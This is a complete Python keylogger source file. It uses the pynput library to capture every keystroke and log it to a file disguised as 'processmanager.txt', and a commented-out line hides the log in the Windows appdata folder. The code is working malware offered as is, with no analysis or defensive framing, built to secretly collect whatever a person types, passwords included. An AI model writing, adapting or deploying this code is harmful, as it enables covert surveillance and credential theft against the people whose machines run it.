import os
from pynput.keyboard import Listener

keys = []
count = 0

#path = os.environ['appdata'] + '\\processmanager.txt' #hiding the keylog o/p file in windows
path = '/root/processmanager.txt'

def write_file(keys):
	with open(path, 'a') as f:
		for key in keys:
			k = str(key).replace("'","") #overiding the default formatting of pynput library.
			if k.find("backspace") > 0:
				f.write(" Backspace ")
			elif k.find("enter") > 0:
				f.write("\n")
			elif k.find("shift") > 0:
				f.write(" Shift ")
			elif k.find("space") > 0:
				f.write(" ")
			elif k.find("caps_lock") > 0:
				f.write(" caps_lock ")
			elif k.find("Key"):
				f.write(k)


def on_press(key):
	global keys, count

	keys.append(key)
	count += 1

	if count >= 1:
		count = 0
		write_file(keys)
		keys = []

if __name__ == "__main__":
	with Listener(on_press=on_press) as listener:
		listener.join() 
